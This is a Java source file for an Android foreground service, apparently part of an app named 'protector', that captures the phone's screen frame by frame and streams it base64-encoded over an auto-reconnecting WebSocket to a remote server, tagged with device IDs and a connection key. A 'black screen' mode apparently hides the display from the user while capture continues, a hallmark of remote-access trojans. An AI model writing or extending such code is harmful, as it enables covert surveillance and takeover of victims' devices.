package com.icontrol.protector;

import static com.icontrol.protector.Consts.SCRQuality;
import static com.icontrol.protector.Consts.URL_SOCKT;
import static com.icontrol.protector.UtliTools.BITMAP_RESIZER;

import android.app.Activity;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Base64;
import android.view.Display;

import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.ref.WeakReference;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;

public class ScreenCaps extends Service {

    private static final String TAG = "iScreenCap";
    private static final String RESULT_CODE = "RESULT_CODE";
    private static final String Qulty = "QULTY";
    private static final String Sockid = "SOCK";
    private static final String DATA = "DATA";
    private static final String ACTION = "ACTION";
    private static final String START = "START";
    private static final String STOP = "STOP";
    private static final String SCREENCAP_NAME = "screencap";



    public static MediaProjection mMediaProjection;
    public static ImageReader mImageReader;
    //private static Handler mHandler;
    public static MediaProjection.Callback mCallBack;
    //public static Display mDisplay;
    public static VirtualDisplay mVirtualDisplay;
    private int mDensity;
    private int mWidth;
    private int mHeight;
    private int mRotation;
    //private OrientationChangeCallback mOrientationChangeCallback;

    //public static SecondarySocket SendSK = null;
    public static List<byte[]> ImagesListByts = new ArrayList<byte[]>();
    public static Object LockSend = new Object();
    public static boolean isAlive = true;
    public static String PID ;

    private Context mContext;

    private OkHttpClient client;
    private WebSocket ws;

    public static Intent getStartIntent(Context context, int resultCode, Intent data,int Quality,String sockid) {
        Intent intent = new Intent(context, ScreenCaps.class);
        intent.putExtra(ACTION, START);
        intent.putExtra(RESULT_CODE, resultCode);
        intent.putExtra(DATA, data);
        intent.putExtra(Qulty, Quality);
        intent.putExtra(Sockid, sockid);
        return intent;
    }

    public static Intent getStopIntent(Context context) {
        Intent intent = new Intent(context, ScreenCaps.class);
        intent.putExtra(ACTION, STOP);
        return intent;
    }

    private static boolean isStartCommand(Intent intent) {
        if(intent == null){
            return false;
        }
        return intent.hasExtra(RESULT_CODE) && intent.hasExtra(DATA)
                && intent.hasExtra(ACTION) && Objects.equals(intent.getStringExtra(ACTION), START);
    }

    private static boolean isStopCommand(Intent intent) {
        if(intent == null){
            return false;
        }
        return intent.hasExtra(ACTION) && Objects.equals(intent.getStringExtra(ACTION), STOP);
    }

    private static int getVirtualDisplayFlags() {
        return DisplayManager.VIRTUAL_DISPLAY_FLAG_PRESENTATION  | DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR;
    }

    private final class ImageAvailableListener implements ImageReader.OnImageAvailableListener {
        @Override
        public void onImageAvailable(ImageReader reader) {



            Bitmap bitmap = null;
            ByteArrayOutputStream baos=new ByteArrayOutputStream();
            try (Image image = mImageReader.acquireLatestImage()) {

                if (image != null) {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * mWidth;

                    //350, 550
                    // create bitmap
                    if(isAlive){
                        bitmap = Bitmap.createBitmap(mWidth + rowPadding / pixelStride, mHeight, Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(buffer);

                        // Bitmap convertedBitmap = bitmap.copy(Bitmap.Config.RGB_565, false);

                        Bitmap compressedBitmap =Bitmap.createScaledBitmap(bitmap, 320, 620, false);
                        //Bitmap compressedBitmap;

                        if (AccessServices.BlackScreen_ON){
//                            long startTime = System.nanoTime();
//
//
//                            long endTime = System.nanoTime();
//                            long durationMs = (endTime - startTime) / 1_000_000; // convert ns to ms
//                            MyLoger.Debug("Timing", "Execution time: " + durationMs + " ms");
                            compressedBitmap = UtliTools.changeImageOpacity(compressedBitmap, 1.0f);
                            compressedBitmap.compress(Bitmap.CompressFormat.JPEG, 30, baos);



                        }else{
                            // compressedBitmap =BITMAP_RESIZER(bitmap, 180, 320);
                            compressedBitmap.compress(Bitmap.CompressFormat.WEBP, SCRQuality, baos);
                        }

                        synchronized(LockSend){
                            if (ImagesListByts.size() < 15){
                                ImagesListByts.add(baos.toByteArray());
                            }else{
                                MyLoger.Error("LiveScreen","images more than 15");
                            }

                        }

                        compressedBitmap.recycle();
                    }



                }

            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (baos != null) {
                    try {
                        baos.close();
                    } catch (IOException ioe) {
                        ioe.printStackTrace();
                    }
                }

                if (bitmap != null) {
                    bitmap.recycle();
                }

            }
        }
    }

    public void SendThread(Context ctx) {
        isAlive=true;

        client = new OkHttpClient();
        Request request = new Request.Builder().url(URL_SOCKT()).build();
        ws = client.newWebSocket(request, new WebSocketListener() {


            @Override
            public void onClosing(@NonNull WebSocket webSocket, int code, @NonNull String reason) {
                super.onClosing(webSocket, code, reason);
                if (isAlive){
                    isAlive=false;
                    //new Thread(() -> {
                        try {
                            Thread.sleep(3000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        SendThread(ctx);
                    //}).start();

                }
               // killall();
            }

            @Override
            public void onFailure(@NonNull WebSocket webSocket, @NonNull Throwable t, @Nullable Response response) {
                super.onFailure(webSocket, t, response);
                if (isAlive){
                    isAlive=false;
                 //   new Thread(() -> {
                        try {
                            Thread.sleep(3000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        SendThread(ctx);
                //    }).start();
                }
                //killall();
            }

            @Override
            public void onOpen(WebSocket webSocket, Response response) {

                Thread thread = new Thread() {
                    @Override
                    public void run() {
                        try {
                            String conctkey = MySettings.Read(ctx,Consts.Redirect_k,My_Configs.CONS_KY);
                            while (isAlive){
                                try {


                                    byte[] BytesTosend =null;

                                    synchronized(LockSend){
                                        if(ImagesListByts.size() > 0){

                                            BytesTosend = (byte[]) ImagesListByts.get(0);

                                            ImagesListByts.remove(0);

                                        }
                                    }
                                    try {
                                        if (BytesTosend != null){

                                            try {
                                                String fromat = "w";
                                                if (AccessServices.BlackScreen_ON){
                                                    fromat = "p";
                                                }
                                                String base64Image = Base64.encodeToString(BytesTosend, Base64.DEFAULT);

                                                JSONObject jsonObject = new JSONObject();
                                                jsonObject.put("type", "screen");
                                                jsonObject.put("img", base64Image);
                                                jsonObject.put("frmt", fromat);
                                                jsonObject.put("skly", "0");
                                                jsonObject.put("wmob", mWidth);
                                                jsonObject.put("hmob", mHeight);
                                                String jsonData = jsonObject.toString();



                                                Livemessage(ctx,jsonData,conctkey);
                                            } catch (Exception e) {
                                                // killall();

                                            }
                                        }
                                    } catch (Exception e) {

                                    }


                                }
                                catch (Exception e){

                                }catch (OutOfMemoryError e) {

                                }

                                try{ Thread.sleep(1);} catch (InterruptedException e) {}
                            }

                        } catch (Exception ex) {
                            ex.printStackTrace();
                        }
                       // killall();
                    }
                };
                thread.start();



            }

            @Override
            public void onMessage( WebSocket webSocket, String text) {
                super.onMessage(webSocket, text);

                try{
                    JSONObject Response = new JSONObject(text);
                    String msgtype = Response.optString("type","empty");
                    if(msgtype.equals("stop") || msgtype.equals("Unauthorized access")){
                        killall();
                    }
                }catch (Exception a){}

            }


        });

//        new Thread(new Runnable() {
//            @Override
//            public void run() {
//
//
//            }
//        }).start();
    }
    public void killall(){
        MySettings.WriteBool(getApplicationContext(), Consts.Send_Skilton,false);
        isAlive = false;
        AccessTools.BlackScreen(false);
        try{
            if (ws != null) {
                ws.cancel();
                ws = null;
            }
            if (client != null) {
                client.dispatcher().cancelAll();
                client.connectionPool().evictAll();
                client.dispatcher().executorService().shutdown();
                client = null;
            }
        }catch (Exception s){

        }
        // Context ctx = getApplicationContext();
        try{
            if (mMediaProjection != null) {
                if (mCallBack != null) {
                    mMediaProjection.unregisterCallback(mCallBack);
                    mCallBack = null;
                }
                mMediaProjection.stop();
                mMediaProjection = null;
            }

            if (mVirtualDisplay != null) mVirtualDisplay.release();
            if (mImageReader != null) mImageReader.setOnImageAvailableListener(null, null);
            mImageReader.close();

            //if (mOrientationChangeCallback != null) mOrientationChangeCallback.disable();
//            if(mMediaProjection != null && mCallBack != null){
//                mMediaProjection.unregisterCallback(mCallBack);
//                mCallBack=null;
//            }
        }catch (Exception a){}
        //mMediaProjection = null;
        mVirtualDisplay = null;
        mImageReader = null;
        //mOrientationChangeCallback = null;
        //mDisplay = null;
        mContext = null;
       try{
           ImagesListByts.clear();
           ImagesListByts = null;
       }catch (Exception a){}

        try{
           stopForeground(false);
           stopSelf();
       }catch (Exception a){}

    }
//    private class OrientationChangeCallback extends OrientationEventListener {
//
//        OrientationChangeCallback(Context context) {
//            super(context);
//        }
//
//        @Override
//        public void onOrientationChanged(int orientation) {
//            final int rotation = mDisplay.getRotation();
//            if (rotation != mRotation) {
//                mRotation = rotation;
//                try {
//                    // clean up
//                    if (mVirtualDisplay != null) mVirtualDisplay.release();
//                    if (mImageReader != null) mImageReader.setOnImageAvailableListener(null, null);
//
//                    // re-create virtual display depending on device width / height
//                    createVirtualDisplay();
//                } catch (Exception e) {
//                    e.printStackTrace();
//                }
//            }
//        }
//    }



    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        mContext = getApplicationContext();
    }
    private static int Notifi_ID = 111;
    private void startforground(Context ctx) {
        try{

            MyNotification MyNotifiint = MyNotification.getInstance(ctx);
            Notification notification = MyNotifiint.createNotification(ctx);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            } else {
                this.startForeground(Notifi_ID, notification);
            }
        }catch (Exception a){}

    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
       try{
           // create notification
           if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
               startforground(getApplicationContext());
           }
           mContext = getApplicationContext();
           if (isStartCommand(intent)) {
              // setSCRQuality();
               SCRQuality = intent.getIntExtra(Qulty,50);
               Consts.SCRSIDF = intent.getStringExtra(Sockid);
//               if (mHandler == null){
//                   new Thread() {
//                       @Override
//                       public void run() {
//                           Looper.prepare();
//                           mHandler = new Handler();
//                           Looper.loop();
//                       }
//                   }.start();
//               }

               Context ctx = getApplicationContext();
               PID = MySettings.Read(ctx,Consts.DEVICE_ID,"null");

               //PID = MyDeviceID.GetID(ctx);


               if (PID == null){
                   MyLoger.Error("At.start.ScreenCap","Can't find Device id");
                   stopProjection();
                   stopSelf();
                   return START_NOT_STICKY;
               }

               // start projection
               int resultCode = intent.getIntExtra(RESULT_CODE, Activity.RESULT_CANCELED);
               Intent data = intent.getParcelableExtra(DATA);
               ImagesListByts = new ArrayList<byte[]>();
               SendThread(ctx);
               startProjection(resultCode, data);

               //return START_STICKY;
           } else if (isStopCommand(intent)) {
               isAlive = false;
               MySettings.WriteBool(getApplicationContext(), Consts.Send_Skilton,false);
               AccessTools.BlackScreen(false);
               stopProjection();

               killall();

              //
           }

           //return START_STICKY;
       }catch (Exception a){
           a.printStackTrace();
       }
        return START_NOT_STICKY;
    }

    private void startProjection(int resultCode, Intent data) {
        MediaProjectionManager mpManager =
                (MediaProjectionManager) getApplicationContext().getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        //if (mMediaProjection == null) {
            mMediaProjection = mpManager.getMediaProjection(resultCode, data);
            if (mMediaProjection != null) {
                // display metrics
                mDensity = Resources.getSystem().getDisplayMetrics().densityDpi;
                //WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
                //mDisplay = windowManager.getDefaultDisplay();


                createVirtualDisplay();

//                mOrientationChangeCallback = new OrientationChangeCallback(getApplicationContext());
//                if (mOrientationChangeCallback.canDetectOrientation()) {
//                    mOrientationChangeCallback.enable();
//                }


            }
      //  }
    }

    private void stopProjection() {
        isAlive = false;
        MySettings.WriteBool(getApplicationContext(), Consts.Send_Skilton,false);
        AccessTools.BlackScreen(false);
        if (ws != null) {
            ws.close(1000, "Closing Screen");
        }
    }

    private void Livemessage(Context ctx, String msg,String conctkey) {
        if (ws != null) {
            try {

                String Myid = MySettings.Read(ctx, Consts.DEVICE_ID, "Deviceid");
                String IDF = MySettings.Read(ctx, Consts.THE_IDF, null);
               // String SecondIDF = MySettings.Read(ctx, Consts.Sec_IDF, "null");

                if (!Consts.SCRSIDF.equals("null")){
                    IDF = Consts.SCRSIDF;
                }
                if (Myid == null) {
                    return;
                }
                if (IDF == null) {
                    return;
                }

                String CIP = MySettings.Read(ctx, Consts.THE_CIP, "null");


                JSONObject message = new JSONObject();
                // message.put("userId", userid);
                message.put("idf", IDF);
                //message.put("sidf", SecondIDF);
                message.put("pid", Myid);
                message.put("itype", "Slr_client");
                message.put("subc", "msg");
                message.put("msg", msg);
                message.put("cip", CIP);

                message.put("conk", conctkey);
                // Send the JSON message as a string
                ws.send(message.toString());
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }
    private static class SafeProjectionCallback extends MediaProjection.Callback {
        private final WeakReference<ScreenCaps> serviceRef;

        SafeProjectionCallback(ScreenCaps service) {
            this.serviceRef = new WeakReference<>(service);
        }

        @Override
        public void onStop() {
            ScreenCaps service = serviceRef.get();
            if (service != null) {
                try {
                    if (service.mVirtualDisplay != null) {
                        service.mVirtualDisplay.release();
                        service.mVirtualDisplay = null;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }


    private void createVirtualDisplay() {
        // get width and height

        mWidth = Integer.valueOf(MySettings.Read(mContext,Consts.Mob_width,"720"));
        mHeight = Integer.valueOf(MySettings.Read(mContext,Consts.Mob_height,"1280"));



        // start capture reader
        mImageReader = ImageReader.newInstance(mWidth, mHeight, PixelFormat.RGBA_8888, 5);

        HandlerThread handlerThread = new HandlerThread("IRT");
        handlerThread.start();
        Handler backgroundHandler = new Handler(handlerThread.getLooper());

        mCallBack = new SafeProjectionCallback(this);
        mMediaProjection.registerCallback(mCallBack, null);


        mVirtualDisplay = mMediaProjection.createVirtualDisplay(SCREENCAP_NAME,  mWidth, mHeight,
                mDensity, getVirtualDisplayFlags(), mImageReader.getSurface(), null, null);




        mImageReader.setOnImageAvailableListener(new ImageAvailableListener(), backgroundHandler);

    }
}
